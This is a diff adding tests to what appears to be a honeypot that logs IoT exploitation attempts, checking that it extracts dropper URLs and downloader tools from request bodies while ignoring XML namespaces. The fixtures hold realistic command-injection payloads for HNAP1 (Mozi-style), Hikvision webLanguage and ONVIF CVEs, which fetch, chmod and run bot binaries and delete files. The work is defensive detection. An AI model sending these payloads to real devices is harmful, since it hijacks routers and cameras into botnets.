@@ -16113,6 +16113,72 @@ def test_extract_payload_urls_busybox_wget_in_command_substitution():
     assert "wget" in tools and "busybox" in tools
 
 
+def test_extract_payload_urls_drops_hnap1_namespace_from_soapaction():
+    """HNAP1 SOAPAction in the Mozi dropper shape. The
+    CVE-2015-2051 command is appended to the HNAP1 namespace URI, so the
+    namespace and the dropper arrive as two separate regex matches — only
+    the dropper may survive."""
+    action = (
+        "http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && "
+        "wget http://192.0.2.10:49133/Mozi.m && chmod 777 /tmp/Mozi.m "
+        "&& /tmp/Mozi.m`"
+    )
+    assert tbenv._extract_payload_urls(action) == [
+        "http://192.0.2.10:49133/Mozi.m"
+    ]
+    assert "wget" in tbenv._extract_downloaders(action)
+
+
+def test_extract_payload_urls_ignores_soap_envelope_namespaces():
+    """The HNAP1 body carries three xmlns declarations and no payload. A
+    body like this must produce an empty list, or every HNAP1 request would
+    log a 'payload URL'."""
+    body = (
+        '<?xml version="1.0" encoding="utf-8"?><soap:Envelope '
+        'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
+        'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '
+        'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
+        '<soap:Body><AddPortMapping xmlns="http://purenetworks.com/HNAP1/">'
+        "<PortMappingDescription>foo"
+    )
+    assert tbenv._extract_payload_urls(body) == []
+
+
+def test_extract_payload_urls_strips_vendor_xmlns_but_keeps_dropper():
+    """ONVIF CVE-2024-7029 body shape. The vendor namespace
+    `http://www.huawei.com/vehicle/nu` is in no standards list — it is
+    dropped structurally because it is an xmlns declaration, which is why
+    the filter is not a host denylist."""
+    body = (
+        '<?xml version="1.0" ?><s:Envelope '
+        'xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>'
+        '<nu:Upgrade xmlns:nu="http://www.huawei.com/vehicle/nu">'
+        "<X-Forwarded-For>127.0.0.1;cd /tmp;rm -f .s;"
+        "wget http://203.0.113.9/wget.sh -O .s;"
+        "busybox wget http://203.0.113.9/wget.sh -O .s;"
+        "curl -o .s http://203.0.113.9/wget.sh"
+    )
+    assert tbenv._extract_payload_urls(body) == ["http://203.0.113.9/wget.sh"]
+    tools = tbenv._extract_downloaders(body)
+    assert {"wget", "curl", "busybox"} <= set(tools)
+
+
+def test_extract_payload_urls_multi_arch_hikvision_body():
+    """CVE-2021-36260 body shape: one dropper host, one URL per
+    architecture. All distinct URLs are kept."""
+    body = (
+        '<?xml version="1.0" encoding="UTF-8"?><language>'
+        "$(wget -q -O /tmp/bot_x86_64 http://198.51.100.20:8114/bot.x86_64; "
+        "chmod +x /tmp/bot_x86_64; /tmp/bot_x86_64 & "
+        "wget -q -O /tmp/bot_i386 http://198.51.100.20:8114/bot.i386; "
+        "chmod +x /tmp/bot_i386"
+    )
+    assert tbenv._extract_payload_urls(body) == [
+        "http://198.51.100.20:8114/bot.x86_64",
+        "http://198.51.100.20:8114/bot.i386",
+    ]
+
+
 def test_extract_payload_urls_deduplicates_and_is_empty_when_clean():
     assert tbenv._extract_payload_urls("username=admin&psd=admin") == []
     assert tbenv._extract_downloaders("username=admin&psd=admin") == []
@@ -16243,6 +16309,112 @@ async def test_soho_router_clean_request_logs_no_payload_fields(flux_client):
     assert last["sohoRouterHasCmdInjection"] is False
     assert "sohoRouterPayloadUrls" not in last
     assert "sohoRouterDownloaders" not in last
+
+
+async def test_hnap1_soapaction_dropper_url_logged(flux_client):
+    """Mozi-shaped SOAPAction. The dropper must land in
+    a structured field; the HNAP1 namespace must not."""
+    resp = await flux_client.get(
+        "/HNAP1/",
+        headers={
+            "SOAPAction": (
+                "http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && "
+                "wget http://192.0.2.10:49133/Mozi.m && "
+                "chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`"
+            )
+        },
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert last["hnap1HasCmdInjection"] is True
+    assert last["hnap1PayloadUrls"] == ["http://192.0.2.10:49133/Mozi.m"]
+    assert "wget" in last["hnap1Downloaders"]
+
+
+async def test_hnap1_plain_envelope_logs_no_payload_fields(flux_client):
+    """A well-formed HNAP1 envelope is nothing but namespaces. If this ever
+    grows a payload field the namespace filter has regressed."""
+    resp = await flux_client.post(
+        "/HNAP1/",
+        data=(
+            '<?xml version="1.0" encoding="utf-8"?><soap:Envelope '
+            'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
+            '<soap:Body><GetDeviceSettings '
+            'xmlns="http://purenetworks.com/HNAP1/"/></soap:Body>'
+            "</soap:Envelope>"
+        ),
+        headers={"Content-Type": "text/xml"},
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert "hnap1PayloadUrls" not in last
+    assert "hnap1Downloaders" not in last
+
+
+async def test_hikvision_weblanguage_dropper_urls_logged(flux_client):
+    """CVE-2021-36260 body shape — multi-arch dropper.
+
+    Sent as POST: flux's front gate only admits GET/HEAD/POST, so the PUT
+    the CVE actually uses never reaches this handler. See
+    `test_front_gate_rejects_put_before_any_trap_handler`."""
+    resp = await flux_client.post(
+        "/SDK/webLanguage",
+        data=(
+            '<?xml version="1.0" encoding="UTF-8"?><language>'
+            "$(wget -q -O /tmp/bot_x86_64 "
+            "http://198.51.100.20:8114/bot.x86_64; "
+            "chmod +x /tmp/bot_x86_64; /tmp/bot_x86_64 & "
+            "wget -q -O /tmp/bot_i386 http://198.51.100.20:8114/bot.i386)"
+            "</language>"
+        ),
+        headers={"Content-Type": "application/xml"},
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert last["hikvisionHasCmdInjection"] is True
+    assert last["hikvisionPayloadUrls"] == [
+        "http://198.51.100.20:8114/bot.x86_64",
+        "http://198.51.100.20:8114/bot.i386",
+    ]
+    assert "wget" in last["hikvisionDownloaders"]
+
+
+async def test_onvif_upgrade_dropper_url_logged(flux_client):
+    """CVE-2024-7029 body shape. The Huawei vendor
+    namespace must be stripped, the dropper kept."""
+    resp = await flux_client.post(
+        "/onvif/device",
+        data=(
+            '<?xml version="1.0" ?><s:Envelope '
+            'xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>'
+            '<nu:Upgrade xmlns:nu="http://www.huawei.com/vehicle/nu">'
+            "<X-Forwarded-For>127.0.0.1;cd /tmp;rm -f .s;"
+            "wget http://203.0.113.9/wget.sh -O .s;"
+            "busybox wget http://203.0.113.9/wget.sh -O .s"
+            "</X-Forwarded-For></nu:Upgrade></s:Body></s:Envelope>"
+        ),
+        headers={"Content-Type": "application/soap+xml"},
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert last["onvifPayloadUrls"] == ["http://203.0.113.9/wget.sh"]
+    assert {"wget", "busybox"} <= set(last["onvifDownloaders"])
+
+
+async def test_onvif_plain_envelope_logs_no_payload_fields(flux_client):
+    resp = await flux_client.post(
+        "/onvif/device",
+        data=(
+            '<?xml version="1.0" ?><s:Envelope '
+            'xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body>'
+            '<tds:GetDeviceInformation xmlns:tds="http://www.onvif.org/ver10/device/wsdl"/>'
+            "</s:Body></s:Envelope>"
+        ),
+        headers={"Content-Type": "application/soap+xml"},
+    )
+    assert resp.status == 200
+    last = _log_entries(flux_client.log_path)[-1]
+    assert "onvifPayloadUrls" not in last
 
 
 async def test_soho_router_disabled_returns_404(flux_client, monkeypatch):
